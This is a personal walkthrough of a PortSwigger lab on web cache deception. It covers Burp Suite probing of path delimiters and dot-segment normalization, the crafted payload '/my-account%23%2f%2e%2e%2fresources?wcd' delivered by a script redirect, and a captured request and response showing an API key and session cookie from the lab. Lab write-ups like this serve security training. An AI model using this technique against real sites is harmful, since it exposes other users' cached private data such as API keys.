URL/Link:
https://0ad900690350d326838c329000fe0077.web-security-academy.net/
Concept:
Web cache exploitation:
Method of solving:
    n Proxy > HTTP history, right-click the GET /my-account request and select Send to Repeater.

    We Changed the URL path to /my-account/abc, then send the request. Notice the 404 Not Found response. This indicates that the origin server doesn't abstract the path to /my-account.

    still we changethe path to /my-accountabc, then send the request. Notice that this returns a 404 Not Found response with no evidence of caching.

    Right-click the message and select Send to Intruder.

    then we gone to the Intruder tab. Make sure that Sniper attack is selected and add a payload position after /my-account as follows: /my-account§§abc.

    In the Payloads side panel, under Payload configuration, add a list of characters that may be used as delimiters.

    Under Payload encoding, deselect URL-encode these characters.

     i Clicked Start attack. The attack runs in a new window.

    When the attack finishes, sort the results by Status code. Notice that the #, ?, %23, and %3f characters receive a 200 response with your API key. This indicates that they're used by the origin server as path delimiters. Ignore the # character. It can't be used for an exploit as the victim's browser will use it as a delimiter before forwarding the request to the cache.

Investigate path delimiter discrepancies

    then to the Repeater tab that contains the /my-accountabc request. Add the ? character after /my-account and add a static extension to the path. For example, update the path to /my-account?abc.js.

    i sended the request. Notice that the response doesn't contain evidence of caching. This either indicates that the cache also uses ? as a path delimiter, or that the cache doesn't have a rule based on the .js extension.

    i repeat this test using the %23 and %3f characters instead of ?. Notice that the responses don't show evidence of caching.

Investigate normalization discrepancies

    Remove the query string and add an arbitrary directory followed by an encoded dot-segment to the start of the original path. For example, /aaa/..%2fmy-account.

    Send the request. Notice that this receives a 404 response. This indicates that the origin server doesn't decode or resolve the dot-segment to normalize the path to /my-account.

    In Proxy > HTTP history, notice that static resources share the URL path directory prefix /resources. Notice that responses to requests with the /resources prefix show evidence of caching.

    Right-click a request with the prefix /resources and select Send to Repeater.

    In Repeater, add an encoded dot-segment and arbitrary directory before the /resources prefix. For example, /aaa/..%2fresources/YOUR-RESOURCE.

    I sent the request. Notice that the 404 response contains the X-Cache: miss header.

    I Resend the request. Notice that the value of the X-Cache header updates to hit. This may indicate that the cache decodes and resolves the dot-segment and has a cache rule based on the /resources prefix. To confirm this, you'll need to conduct further testing. It's still possible that the response is being cached due to a different cache rule.

    Add an encoded dot-segment after the /resources path prefix as follows: /resources/..%2fYOUR-RESOURCE.

    I SenT the request. Notice that the 404 response no longer contains evidence of caching. This indicates that the cache decodes and resolves the dot-segment and has a cache rule based on the /resources prefix.

Craft an exploit

    Go to the Repeater tab that contains the /aaa/..%2fmy-account request. Use the ? delimiter to attempt to construct an exploit as follows:
    /my-account?%2f%2e%2e%2fresources

    Sent the request. Notice that this receives a 200 response with your API key, but doesn't contain evidence of caching.

    i Repeated this test using the %23 and %3f characters instead of ?. Notice that when you use the %23 character this receives a 200 response with your API key and the X-Cache: miss header. Resend and notice that this updates to X-Cache: hit. You can use this delimiter for an exploit.

    In Burp's browser, click Go to exploit server.

    In the Body section, craft an exploit that navigates the victim user carlos to a malicious URL. Make sure to add an arbitrary parameter as a cache buster:
    <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>

    Click Deliver exploit to victim.

    Go to the URL that you delivered to carlos in your exploit:
    https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd

    Notice that the response includes the API key for the user carlos. Copy this.

    Click Submit solution, then submit the API key for carlos to solve the lab.

Request from the Repeater:
GET /my-account%23%2f%2e%2e%2fresources HTTP/2
Host: 0a8e0062042f7bb980c5033600240076.web-security-academy.net
Cookie: session=10m0Q0aJJnMsELDTKI56A97U06TrYmyo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8e0062042f7bb980c5033600240076.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

Response with the API key:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 3866

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Exploiting cache server normalization for web cache deception</title>
    </head>
    <body>
        <script type="text/javascript" src="/resources/js/tracking.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Exploiting cache server normalization for web cache deception</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0afb00fa04ed7b0680bb02d601ab00df.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' >Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-cache-server-normalization'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: wiener</p>
                        <div>Your API Key is: oRnyAd2oJ4Oxa5pypXs0s8fI3EfP3OIR</div><br/>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="sRSjhT2eU1IWfLkJqAlQGAzfLYKxFzh5">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>


